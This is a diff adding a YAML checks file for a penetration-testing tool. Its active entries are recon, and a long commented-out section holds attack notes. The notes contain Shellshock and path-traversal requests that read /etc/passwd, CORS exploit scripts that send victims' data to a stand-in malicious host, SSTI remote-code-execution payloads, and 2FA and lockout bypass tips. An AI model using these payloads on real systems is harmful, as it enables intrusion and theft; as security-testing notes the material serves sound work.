@@ -1,0 +1,809 @@
+checks:
+
+  # ---------------------------------------------------------------------------
+  # Oracle T3 checks
+  # ---------------------------------------------------------------------------
+  - id: oracle-t3_recon_t3_protocol
+    methods: 
+    - id: via_auto_nmap
+      type: cmd
+      cmd: 
+          - "nmap -sS -p 7001-7010 --open {host}"
+      regex: "(700[0-9]|7010)/tcp.*open"
+      notes: >
+        Exploits
+        --------
+        - Via CVE-2020-14576: WebLogic T3/IIOP RCE ExternalizableHelper.class of coherence.jar. Exploit @ https://github.com/Y4er/CVE-2020-14756
+
+  # ---------------------------------------------------------------------------
+  # HTTPS-Specific Checks
+  # ---------------------------------------------------------------------------
+  - id: https_auto_recon_scan_ssl_configuration
+    methods:
+    - id: via_auto_testssl
+      type: cmd
+      cmddir: /opt/testssl.sh
+      cmd:
+        - "./testssl.sh {host}"          
+      notes: >
+        Call on testssl.sh
+
+  # ---------------------------------------------------------------------------
+  # Section: HTTP/HTTPS Checks
+  # ---------------------------------------------------------------------------
+  - id: http_https_recon_vue_js_framework
+    methods:
+    - id: via_auto_recon
+      type: webrequest
+      url: 
+        - "{target}"
+      regex: "^HTTP/1.1 2.*(/vue.js|/vue@2|/vue\")"
+      notes: >
+        Exploits:
+        ---------
+        - Vue.js Javascript Library Client-Side Template Injection. Exploit @ https://twitter.com/wugeej/status/1354312840681668610?s=20
+
+  - id: http_https_carbon_admin_pages
+    methods: 
+    - id: via_auto_curl
+      type: webrequest
+      url: 
+        - "{basepath}/carbon/admin/login.jsp"
+      regex: "^HTTP/1.1 2.*(carbonFormStyles|CARBON\\.showWarning)|WSO2 Carbon"
+      notes: >
+        Exploits:
+        ---------
+        WSO2 Carbon Admin login page has known vulnerabilities e.g. 
+          https://www.exploit-db.com/exploits/40240.
+        
+        It also can sometimes have default admin/admin login credentials as per 
+        https://medium.com/@kosalasananthana/changing-password-in-wso2-carbon-products-5dd5c808587e#:~:text=Go%20to%20carbon%20management%20console,default%20is%20admin%2Fadmin).
+
+  - id: https_recon_website_https_missing_strict_transport_security
+    methods:
+    - id: via_auto_curl_headers
+      type: webrequest
+      url:
+        - "{target}"
+      regex: "HTTP/1.1 2.*(Strict-Transport-Security)"
+      alert_on_missing: true
+      notes: >
+        Check if HSTS header is present
+
+  - id: http_https_recon_information_disclosure
+    methods:
+    - id: via_manual_developer_comments
+      type: notes
+      notes: > 
+        - Look for the developer comments in Burpsuite e.g. starting with 
+          '//', '<!--'
+    - id: via_manual_error_messages_burpsuite
+      type: notes
+      notes: > 
+        - Add [] to input parameters, or ' and enable grep search to look 
+        for error messages
+
+  - id: http_https_recon_robots_txt_file
+    methods:
+    - id: via_auto_webrequest
+      type: webrequest
+      url: 
+        - "{basepath}/robots.txt"
+      regex: "2.*(text/plain|application/text).*(Disallow:|User-agent:|)"
+
+  - id: http_https_recon_sitemap_file
+    methods:
+    - id: via_auto_webrequest
+      type: webrequest
+      url:
+        - "{basepath}/sitemap.xml"
+      regex: "2.*(text/xml|application/xml)"
+      notes: >
+        Provides a list of the site map XML files
+
+  # https_recon_website_https_missing_strict_transport_security_includesubdomains:
+  #   via_auto_curl_headers:
+  #     type: webrequest
+  #     url:
+  #       - "{target}"
+  #     regex: "HTTP/1.1 2.*(Strict-Transport-Security.*;\\s*includeSubdomains)"
+  #     alert_on_missing: true
+  #     notes: >
+  #       Check if HSTS header has the includeSubdomains clause. If not, the 
+  #       browser does not redirect OR prevent access to bypass HTTPS error on the
+  #       subdomains 
+
+  #       Taken from: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html
+  
+  # http_https_recon_waf_detection:
+  #   via_auto_wafw00f:
+  #     type: cmd
+  #     cmd:
+  #       - wafw00f {target}
+
+  # http_https_recon_sonicwall_ssl_vpn_scan:
+  #   via_auto_gcs:
+  #     type: cmd
+  #     cmd:
+  #       - gcs -i {target} -c id
+  #     regex: "VULNERABLE.*(uid=|id=)"
+  #     notes: >
+  #       Taken from: https://github.com/gustavorobertux/gcs
+
+  # http_https_recon_apache_flink:
+  #   via_auto_curl_jobmanager_logs_page:
+  #     type: webrequest
+  #     url: 
+  #       - "{basepath}/jobmanager/logs/"
+  #     regex: "^HTTP/1.1 2.*(application/json|text/json|jobmanager\\.log)" 
+
+  #   via_auto_curl_overview_page: 
+  #     type: webrequest
+  #     url:
+  #       - "{basepath}/#/overview"
+  #     regex: "^HTTP/1.1 2.*(Apache Flink Dashboard|Apache Flink Web Dashboard)"
+  
+  # http_https_recon_fortiweb_cve_2021_22122:
+  #   via_auto_curl:
+  #     type: webrequest
+  #     url:
+  #       - "{basepath}/error3?msg=30&data='';alert('testing123');//"
+  #       - "{basepath}/omni_success?cmdb_edit_path=\");alert('testing123');//"
+  #     regex: "^HTTP/1.1 2.*('testing123')"
+
+  # http_https_recon_website_detect_technologies:
+  #   via_auto_webtech: 
+  #     type: cmd
+  #     cmd:
+  #       - "webtech -u {target}"   
+
+  #   via_auto_whatweb:
+  #     type: cmd
+  #     cmd:
+  #       - "whatweb {target}"
+    
+  #   via_auto_curl_headers:
+  #     type: cmd
+  #     cmd:
+  #       - "curl -k -s -v -L -o /dev/null {target}"
+  #       - "curl -k -s -v -o /dev/null {target}"
+    
+  #   via_auto_curl_header_realm:
+  #     type: cmd
+  #     cmd:
+  #       - "curl -k -s -L -v {target} -o /dev/null 2>&1 | grep -i 'www-authenticate'"
+  #       - "curl -k -s -v {target} -o /dev/null 2>&1 | grep -i 'www-authenticate'"
+
+  #   via_manual_powered_by_created_by:
+  #     type: notes
+  #     notes: >
+  #       Look for 'Powered By', 'Created By' in Burpsuite requests/responses
+
+  #   via_manual_firefox_wappalyzer:
+  #     type: notes
+  #     notes: >
+  #       - Use Wappalyzer extension for Firefox 
+
+  #   via_manual_builtwith:
+  #     type: notes
+  #     notes: >
+  #       - "https://builtwith.com/?{target}"
+
+  #   via_manual_whatcms_org:
+  #     type: notes
+  #     notes: >
+  #       - "https://whatcms.org"
+
+  #   via_auto_http_favicon_nmap:
+  #     type: cmd
+  #     cmd:
+  #       - nmap -p {port} -Pn -sS --script=http-favicon {host}
+
+  # http_https_recon_http_methods:
+  #   via_auto_nmap:
+  #     type: cmd
+  #     cmd:
+  #       - nmap -p {port} -Pn -sV --script=http-methods {host}
+  
+  # http_https_recon_nodejs_express:
+  #   via_auto_curl:
+  #     type: webrequest
+  #     url: 
+  #       - "{target}"
+  #     regex: "^HTTP/1.1 2.*(X-Powered-By:\\s*Express)"
+
+  # http_https_recon_apache_flink_etc_passwd_cve_2020_17519:
+  #   via_auto_curl_etc_passwd_page:
+  #     type: webrequest
+  #     url: 
+  #       - "{basepath}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+  #     regex: "^HTTP/1.1 2.*(root:.{1,2}:0:0|daemon:.{1,2}:.{1,2}:.{1,2})"
+
+  # http_https_recon_sonicwall_ssl_vpn_vulnerability:
+  #   via_auto_curl_sonicwall_header:
+  #     type: webrequest
+  #     url: 
+  #       - "{basepath}/cgi-bin/welcome"
+  #     regex: "SonicWALL SSL-VPN"
+  #     notes: >
+  #       Taken from: https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+
+  #   via_auto_curl_shellshock:
+  #     type: webrequest
+  #     url: 
+  #       - "{basepath}/cgi-bin/jarrewrite.sh"
+  #     headers:
+  #       User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+  #     regex: "root:"
+  #     notes: >
+  #       Taken from: https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+        
+  # http_https_recon_take_website_screenshot:
+  #   via_manual_gowitness_bhwebsitescreenshot:
+  #     type: notes
+  #     notes: >
+  #       Clone the script bhwebsitescreenshot.sh which will install gowitness docker image
+  #       and run the command
+
+  #       https://github.com/manasmbellani/bhwebsitescreenshot
+
+  #   via_manual_phantomjs_webscreenshot:
+  #     type: notes
+  #     notes: >
+  #       Follow the steps here to setup and use 
+  #         https://github.com/maaaaz/webscreenshot/wiki/PhantomJS-installation#windows
+
+  #       - mkdir -p /opt/dockershare/out-vulnreview-webscreenshots/
+  #       - webscreenshot {target} -o /opt/dockershare/out-vulnreview-webscreenshots/
+  #       - ls -l /opt/dockershare/out-vulnreview-webscreenshots/
+        
+  #       Based on: 
+  #         https://github.com/maaaaz/webscreenshot
+
+  #       Note that installing on Mac OS X:
+  #         brew tap homebrew/cask
+  #         brew cask install phantomjs
+
+  # http_https_recon_csrf:
+  #   via_manual_burpsuite:
+  #   type: notes
+  #   notes: >
+  #     # Requirements of CSRF
+  #     ## The user must be authenticated to the app
+  #     ## Attacker knows the URL for the app 
+  #     ## The info sent to the app when performing the app is not unique across sessions and users aka no csrf token
+  #     ## The attacker is able to trick the user into clicking a URL or socially engineer the user into performing an action
+
+  #     # Detection
+  #     ## key operations have anti-forgery token e.g. 
+  #     ## sending emails (can cause worm), 
+  #     ## deleting items, 
+  #     ## changing email address,
+  #     ## changing passwords (auth bypass), 
+  #     ## making transactions,
+  #     ## modifying profile, 
+  #     ## tweeting (can cause worm), 
+  #     ## creating users
+
+  #     # Prevention
+  #     ## Anti-forgery tokens - a value that an attacker doesn't know
+  #     ## use old password on password reset page
+  #     ## Same-site cookie header
+  #     ### lax - if get request was made from another site, cookie is going to be sent
+  #     ### strict - cookie not sent at all if request not made from the same site (whether it be get/post)
+
+
+  # http_https_oauth2_flow_vulnerabilities:
+  #   via_auto_detect_curl:
+  #     type: webrequest
+  #     url:
+  #       - "{basepath}/.well-known/oauth-authorization-server"
+  #       - "{basepath}/oidc/.well-known/oauth-authorization-server"
+  #       - "{basepath}/.well-known/openid-configuration"
+  #       - "{basepath}/oidc/.well-known/openid-configuration"
+  #     regex: "^HTTP/1.1 2.*(application/json|application/x-json|client_secret|revocation_endpoint|token_endpoint|authorization_endpoint|response_modes_supported|grant_types_supported|subject_types_supported|id_token_signing_alg_values_supported|code_challenge_methods_supported|claims_supported|userinfo_endpoint|jwks_uri)"
+  #     notes: >
+  #       Example taken from: 
+  #         https://login.eveonline.com/.well-known/oauth-authorization-server
+
+  #   via_manual_burpsuite: 
+  #     notes: >
+  #       Explanation
+  #       -----------
+
+  #       OAuth2 Grant Types: -
+  #         Taken from: https://portswigger.net/web-security/oauth/grant-types
+
+  #       Exploitation
+  #       ------------
+  #       - Via burpsuite
+  #         - Can we change the first username to another unauthenticated username for a token after successful authentication with first user?. Taken from: https://portswigger.net/web-security/oauth/grant-types
+  #         - Does the call to /auth?client_id=...&redirect_uri=.... and/or /callback?&auth_code=... missing a state or csrf token?
+  #           - if yes, then we could create a csrf exploit to invoke it from an administrator's account
+  #           - Taken from: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
+  #         - Could we just remove the CSRF token and see if the request still goes through?
+  #           - If it does, then we could invoke the OAuth2 request from our account and link our account on theirs
+  #         - Does the call to /auth?client_id=...&redirect_uri=.... and/or /callback?&auth_code=... missing a state or csrf token?
+  #           - If yes, then we could create a csrf exploit to invoke it from an administrator's account
+  #           - Submit form as soon as page is accessed - See `Form submission` in `pentesting_vulscan` in notes
+  #           - Taken from: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
+
+
+  #         - Can we modify callback to support arbitrary values:
+  #           - Try adding more things after a valid url e.g. https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
+  #           - Add redirect_uri multiple parameters 
+  #             - Example: https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
+  #           - Try localhost/127.0.0.1
+  #             - Why it works?
+  #               - Sometimes have special preference added during testing
+  #             - More things to try: https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses
+  #             - change response_mode:
+  #               - change from code/token to fragment and see if it accepts different URIs
+  #           - We can prepare a CSRF exploit to get to an admin to send the authorization_code to attacker specified callback
+  #           - Use this authorization code to intercept our request and replace the authorization code when logging in
+
+  #       - Open Redirects
+  #         - Could we modify the path to accept ../../ paths for directory traversal in callback?
+  #         - If vulnerabiilty on this page for open redirect, we can abuse this by editing the callback 
+  #         redirect_uri in request to the OAuth server to accept ./../ dir traversal to the page on the 
+  #         local app with the open redirect vulnerability
+
+  #         The open redirect receives the implicit oauth as a hash which can be parsed by a script
+
+  #       - Profile Linking?
+  #         - check if oauth being used for profile linking e.g for client to allow application to be attached to a social media account
+  #         - Intercept the request and see how it works?
+  #         - If it works by sending back a linking token to the client app, we can invoke csrf to authenticate as attacker, drop the last response where linking token is returned to client app AND then submit it as a CSRF POC via the Admin account
+  #           - Taken from: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
+        
+  #       Prevention
+  #       ----------
+  #       - Modify the callbacks so only a whitelist of callbacks are accepted. 
+
+  # http_https_recon_detect_xss:
+  #   via_manual_bhwfuzz_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Detect via intruder + keywords list available in `bhwfuzz` project
+
+  #       Exploit
+  #       -------
+  #       For GET - via iframe to be delivered to a victim with XSS 
+  #         <html>
+  #         <body>
+  #           <iframe width=1 height=1 src='https://<vulnerable-website>.com/id=<script>alert(1)</script>'></iframe>
+  #         </body>
+  #         </html>
+        
+  #       via script javascript for POST body
+  #         <html>
+  #         <body>
+  #           <form id="myForm" action="/">
+  #             First name: <input type="text" name="fname" value="OK"><br>
+  #             Last name: <input type="text" name="id" value="<script>alert(1)</script>"><br><br>
+  #           </form>
+  #           <script>
+  #             document.getElementById("myForm").submit();
+  #           </script>
+  #         </body>
+  #         </html>
+
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_header:
+  #   via_auto_detect_access_control_allow_origin_curl:
+  #     type: webrequest
+  #     url:
+  #       - "{target}"
+  #     headers:
+  #       Origin: "{domain}"
+  #     regex: "Access-Control-Allow-Origin:"
+  #     notes: >
+  #       Checks if 'Access-Control-Allow-Origin' is even returned for any calls
+
+  #   via_auto_detect_access_control_allow_credentials_curl:
+  #     type: webrequest
+  #     url:
+  #       - "{target}"
+  #     headers:
+  #       Origin: "{domain}"
+  #     regex: "Access-Control-Allow-Credentials\\s*:\\s*true"
+  #     notes: >
+  #       Checks if 'Access-Control-Allow-Credentials' is even returned for any calls
+    
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Check in burpsuite history via search, if there is mention of
+  #       "Access-Control-Allow-Origin:" OR 'Access-Control-Allow-Credentials'.
+
+  #       Note generally, Origin: is required, so perhaps poke around with 
+  #       repeater as well.
+
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_xss_bypass:
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Detect
+  #       -------
+  #       If the website trusts a domain/subdomain with XSS vulnerability, then 
+  #       CORS bypass is possible
+
+  #       So check if all/any subdomains are actually allowed in response.
+        
+  #       Exploit
+  #       -------
+  #       E.g. if the server responds with 
+  #         HTTP/1.1 200 OK
+  #         Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+  #         Access-Control-Allow-Credentials: true
+        
+  #       Then, we can exploit it as follows:
+  #         https://subdomain.vulnerable-website.com/?xss=<script>cors-exploit-here</script>
+  #       where 'cors-exploit-here' contains the exploit code similar to the one used 
+  #       above for 'http_https_recon_cross_origin_resource_sharing_cors_acao_any_origin_allowed'
+
+  #       Example exploit code for Portswigger Lab: https://portswigger.net/web-security/cors/lab-breaking-https-attack: 
+  #         <html>
+  #         <body>
+  #         <iframe width=1 height=1 src="https://stock.ac101f5f1f86526c803ec2bd006300d6.web-security-academy.net/?storeId=1&productId=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac271f081f7473dd807853c6006f00d5.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://ac4d1fa41fb1527c8050c26801140084.web-security-academy.net/log?key='%2Bbtoa(this.responseText); };</script>"</iframe>
+  #         </body>
+  #         </html>
+
+  #       Taken from: https://portswigger.net/web-security/cors
+
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_insecure_tls_protocol_bypass:
+  #   via_manual_cors:
+  #     type: notes
+  #     notes: >
+  #       If insecure domains are trusted, then it is possible to direct a user
+  #       utilising HTTP requests to be redirected to the insecure domain which is
+  #       trusted and inject javascript within the page which makes the CORS request
+  #       to the victim domain
+
+  #       Detect
+  #       ------
+  #       Is http://<victim-domain/victim-subdomain> actually trusted?
+
+  #       Exploit
+  #       --------
+  #       To exploit, a victim who is accessing HTTP site can be injected to visit
+  #       the site
+
+  #       Taken from: https://portswigger.net/web-security/cors
+
+
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_any_origin_allowed:
+  #   via_auto_curl:
+  #     type: webrequest
+  #     url: 
+  #       - "{target}"
+  #     headers:
+  #       Origin: "https://malicious-website.com"
+  #     regex: "Access-Control-Allow-Origin\\s*:\\s*(https://malicious-website.com|\\*)"
+
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Detect
+  #       ------
+  #       Set Origin: https://malicious-website.com for important calls that return 
+  #       sensitive information e.g. sensitive API response calls
+        
+  #       If we get a response back in `Access-Control-Allow-Origin: https://malicious-website.com` and `Access-Control-Allow-Credentials: true`, then 
+  #       we are able to make requests as that user from any domain 
+
+  #       Exploit
+  #       -------
+  #       Following code can be used to make a call from a malicious domain:
+  #         <html>
+  #         <body>
+  #         <script>
+  #         var req = new XMLHttpRequest();
+  #         req.onload = reqListener;
+  #         req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+  #         req.withCredentials = true;
+  #         req.send();
+
+  #         function reqListener() {
+  #         location='https://malicious-website.com/log?key='+btoa(this.responseText);
+  #         };
+  #         </script>
+  #         </body>
+  #         </html>
+        
+  #       Taken from: https://portswigger.net/web-security/cors
+  
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_incorrect_origin_validation:
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Detect
+  #       ------
+  #       If an origin is trusted, can we prefix or suffix something in front for URLs returing
+  #       sensitive information and Detect
+
+  #       E.g. If 'Origin: trusteddomain.com' is trusted, can we try 'Origin: eviltrusteddomain.com'
+  #       OR 'Origin: trustedomain.com-evil.com' on requests with responses that return sensitive API information?
+
+  # http_https_recon_cross_origin_resource_sharing_cors_acao_null_origin_allowed:
+  #   via_auto_curl:
+  #     type: webrequest
+  #     url: 
+  #       - "{target}"
+  #     headers:
+  #       Origin: "null"
+  #     regex: "Access-Control-Allow-Origin\\s*:\\s*(null|\\*)"
+  #     notes: >
+  #       If Access-Control-Allow-Credentials set to True, then even more dangerous
+  #       as we can utilise cookies to pull down the data.
+    
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Detect
+  #       ------
+  #       Send `Origin: null` in response for important calls that return 
+  #       sensitive information e.g. sensitive API response calls
+
+  #       Exploit
+  #       -------
+  #       An iframe generates a `null` origin
+  #       <html>
+  #       <body>
+  #         <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+  #         var req = new XMLHttpRequest();
+  #         req.onload = reqListener;
+  #         req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+  #         req.withCredentials = true;
+  #         req.send();
+
+  #         function reqListener() {
+  #         location='https://malicious-website.com/log?key='+btoa(this.responseText);
+  #         };
+  #         </script>"></iframe>
+  #       </body>
+  #       </html>
+
+  #       Taken from: https://portswigger.net/web-security/cors
+
+  # http_https_recon_server_side_template_injection_ssti:
+  #   via_manual_bhwfuzz: 
+  #     notes: > 
+  #       Detect:
+  #         - See `via_manual_bhwfuzz` in `http_https_recon_fuzz`.
+  #         - If issue is present in the email or username, look in other pages as well for template setting the username or email address.
+  #         - Identify the Framework basedo on the payload:
+  #           - Cobalt.io: https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
+  #           - Burpsuite Portswigger: https://portswigger.net/web-security/server-side-template-injection
+  #         - Do any errors get triggered with  specific information about the type of template in use?
+  #           - Review the documentation and Security FAQ for any known issues e.g. Freemarker template: https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
+  #         - Sometimes we may need to escape the context e.g. try '7*7}}{{' if the code
+  #           has been captured in the ' {{' + name + '}} '.
+  #             - Taken from: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
+          
+
+  #       Exploit:
+            
+  #         - For Ruby ERB, 
+  #           - To Read Arbitrary files:
+  #             <%= File.open(‘/etc/passwd’).read %>
+  #           - To determine class names:
+  #             <%= self.class.name %>
+  #             <%= self.methods %>
+  #             <%=@server.instance_variables %>
+  #           - To list the directories:
+  #             <%= Dir.entries('/') %>
+  #             <%= File.open('/example/arbitrary-file').read %>
+  #           - To get SSL context which includes the private key for SSL:
+  #             <% ssl=@server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variables %>
+  #             <% ssl = @server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variable_get(:@key) %>
+  #           - To exec remote code execution (RCE):
+  #             <%= system('id -u') %>
+  #           - Taken from: https://www.trustedsec.com/blog/rubyerb-template-injection/
+
+  #         - For Tornado Python, 
+  #           - For Remote Code Execution (RCE):
+  #             {%import% os%}{{os.popen('whoami').read()}}
+  #           - Taken from: https://ajinabraham.com/blog/server-side-template-injection-in-tornado  
+
+  #         - For Freemarker template, 
+  #           - For Remote Code Execution:
+  #             <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+  #           - Taken from: https://gist.github.com/aancw/492581f5faed962993c71cf233d52942
+  #           - Used in: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
+            
+  #         - For HandleBars SSTI template,
+  #           - For Remote Code Execution,
+  #             See: https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
+
+  #         - For Java:
+  #             - List the Environment variables which contain sensitive credentials:
+  #                 - ${T(java.lang.System).getenv()}
+          
+  #         - For django, 
+  #           - List the secret key
+  #               {{SETTINGS.SECRET_KEY}}
+  #           - List debug information 
+  #                 {% debug %}
+  #         - For Velocity,
+  #           - RCE
+  #             $class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")
+
+  #         - Payloads for other systems:
+  #             - Cobalt.io: Long List of exploits @ https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
+  #             - Another list of exploits: https://gist.github.com/aancw/492581f5faed962993c71cf233d52942
+  #             - Albinowax's exploits for Twig, Smarty, FreeMarker: https://portswigger.net/research/server-side-template-injection
+          
+  #         - Custom exploit creation for custom frameworks/sandboxes:
+  #           - Via Burpsuite Portswigger: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment
+
+  # http_https_exploit_bypass_admin_forbidden_401_403_pages:
+  #   via_manual_burpsuite:
+  #     type: notes
+  #     notes: >
+  #       Exploit to Bypass forbidden pages
+  #       ---------------------------------
+  #       - Attempt X-Forwarded-For: 127.0.0.1 as described here:
+  #         - https://hackerone.com/reports/1070889
+
+  # http_https_recon_interesting_keywords:
+  #   via_manual_burpsuite_intruder_regex_search:
+  #     type: notes
+  #     notes: >
+  #       # Search in Burpsuite scope tab with regex turned on and get the keywords as follows
+  #       cat ./wordlist.txt | grep -viE "^# " | tr -s "\n" "|"
+
+  #       # Fortiweb systems are known to be vulnerable to various vulns e.g. XSS
+  #       Fortiweb
+  #       # Is Oauth2 in-use - these should appear in the parameter
+  #       /authorization
+  #       redirect_uri=
+  #       client_id=
+  #       callback=
+  #       response_type=
+  #       # Node.JS Express - known to be vulnerable to Template  Injection
+  #       X-Powered-By: Express
+
+
+  # http_https_recon_fuzz:
+  #   via_manual_bhwfuzz: 
+  #     type: notes
+  #     notes: >
+  #       - For GET requests, 
+  #         - Execute bhwfuzz: https://github.com/manasmbellani/bhwfuzz for GET requests
+  #         - Execute for each endpoint and read instructions in wordlist.txt
+
+  #   via_manual_burpsuite:
+  #     notes: >
+  #       - For POST requests,
+  #         - Execute Burpsuite
+  #       - Ensure that we attempt Stored XSS and Template Injection checks and look in other places
+  #         E.g. check the name/username if the field modified.
+
+  # http_https_recon_explore_website:
+  #   via_manual_firefox_console: >
+  #     Leave console displayed when browsing the website to see if there are any 
+  #     interesting errors
+
+  #   via_manual_firefox_web_extensions: >
+  #     S3 bucket list
+  #     Web security tool 
+  #     Wappalyzer
+  #     Hackbar
+  #     Flagfox
+  #     SSRF King: https://github.com/ethicalhackingplayground/ssrf-king
+  #     Resurrect pages
+  #         - https://addons.mozilla.org/en-US/firefox/addon/resurrect-pages/
+  #     Easy XSS
+  #         - https://addons.mozilla.org/en-US/firefox/addon/easy-xss/?src=search
+  #     Foxyproxy
+  #     iMacros
+  #         For recording tasks
+  #         help
+  #         - https://imacros.net/browser/fx/welcome/?utm_source=browser&utm_medium=product
+  #     Taken from:
+  #       https://github.com/mazen160/Firefox-Security-Toolkit
+  
+  # http_https_recon_username_enumeration_or_password_bruteforce:
+  #   via_manual_burpsuite_reverse_cookie_stayloggedin_cookie:
+  #     type: notes
+  #     notes: >
+  #       Is it possible to reverse the bruteforce cookie with Base64 Decoding / Hashing e.g. MD5Sum?
+  #         https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
+
+  #       If yes, could we utilise this cookie to potentially login as another user?
+  #       Taken from: 
+  #         https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
+
+  #   via_manual_burpsuite_invalid_username_unusual_message:
+  #     type: notes
+  #     notes: >
+  #       - Does providing an invalid username generate an unusual message, response code or response length that indicates username is invalid?
+  #   via_manual_burpsuite_invalid_username_subtle_message:
+  #     type: notes
+  #     notes: >
+  #       - Prepare a grep-extract and grep-match rule around the message and see if a valid username and invalid username indicate subtle difference - Taken from: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
+  #   via_manual_burpsuite_invalid_username_response_time:
+  #     type: notes
+  #     notes: >
+  #       - Look at the other columns e.g. the time to complete a response indicates a valid/invalid username
+  #       - Set a really long string for password (>200 chars long) and loop through all usernames - is there a username that takes a very long time to respond via the 'Response Received' column in Intruder? Taken from: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
+  #   via_manual_burpsuite_account_lockout_error_message:
+  #     type: notes
+  #     notes: >
+  #       Use the clusterbomb method to repeat requests by sending an arbitraryval in query/post body with set 1 - 5 (repeat 5 times) e.g. 
+  #           username=$test$&password=$password$&arbval=$test$
+
+  #       Check if an account locks out - if it does and you get a separate message to an account that does not exist, we can do account enumeration.
+
+  #       Determine when the account unlocks, because we could then access the account when it unlocks. 
+  #   via_manual_burpsuite_json_request:
+  #     type: notes
+  #     notes: >
+  #       If the request takes a JSON POST body instead of a form-body, can we supply multiple passwords as a JSON array e.g.
+  #         {"username":"carlos","password":["123456","password","12345678","qwerty",....],}
+        
+  #       To generate the passwords from an input wordlist, use the following:
+  #         cat /tmp/test.txt | xargs -I ARG echo '"ARG",' | tr -d "\n"
+
+  #       The server may actually pick up any of the passwords in the list.
+  
+  # http_https_recon_password_reset:
+  #   via_manual_email_reset_password_sent_in_clear_text:
+  #     type: notes
+  #     notes: >
+  #       Is Reset Password? sent in clear text to email?
+
+  #   via_manual_email_reset_password_via_unique_field:
+  #     type: notes
+  #     notes: >
+  #       Can we Reset Password password of another user via an editable field?
+
+  # http_https_recon_account_lockout_bypass:
+  #   via_manual_burpsuite_valid_password:
+  #     type: notes
+  #     notes: >
+  #       Is there a difference in response when a valid or invalid password is attempted even for a locked account? 
+  #       If yes, then we can bruteforce.
+  #       Taken from: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
+
+  #   via_manual_burpsuite_x_forwarded_for:
+  #     type: notes
+  #     notes: >
+  #       - Add an x-forwarded-for header with IP to loopback OR keep rotating the IP address. Taken from: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
+  #   via_manual_burpsuite_cookie:
+  #     type: notes
+  #     notes: >
+  #       - Remove the cookie - does it release the lock?
+  #   via_manual_burpsuite_valid_login_first_reset_lockout:
+  #     type: notes
+  #     notes: >
+  #       - If we login with a valid creds (username/password) and a cookie, then login with an invalid one, can we bypass the login, then valid creds and then invalid again - do we reset the lockout count to 0?
+  #       - Taken from: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
+
+  # http_https_recon_2fa_bypass:
+  #   via_manual_burpsuite_bruteforce_2fa_code:
+  #     type: notes
+  #     notes: >
+  #       - Can we bruteforce 2FA code if it is too short?
+  #   via_manual_burpsuite_forced_browsing:
+  #     type: notes
+  #     notes: >
+  #       - Can we simply go to the authenticated page received after prompt for 2FA authentication - aka forced browsing to the authenticated page and dropping any 2fa request via Burpsuite Proxy Intercept tab? Vulnerability is that we are not tracking whether the 2FA is provided or not.
+  #   via_manual_burpsuite_bruteforce_2fa_success_flags:
+  #     type: notes
+  #     notes: >
+  #       - Could we change a flag to true (OR remove it altogether) to make the request authenticated for 2FA when redirecting to login page, hence, bypassing 2FA authentication? Taken from: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
+  #   via_manual_burpsuite_generate_2fa_for_another_user_by_manipulating_params:
+  #     type: notes
+  #     notes: >
+  #       - If web app supports 2FA, can we generate the 2FA for another username by manipulating the parameters in redirection during successful auth of 1st step (username/password), and then brute-force the 2FA generated? E.g. in Burpsuite 2FA authentication, https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic 
+
+  # http_https_recon_discover_new_paths:
+  #   via_manual_thesaurus_synonyms_testing:
+  #     type: notes
+  #     notes: >
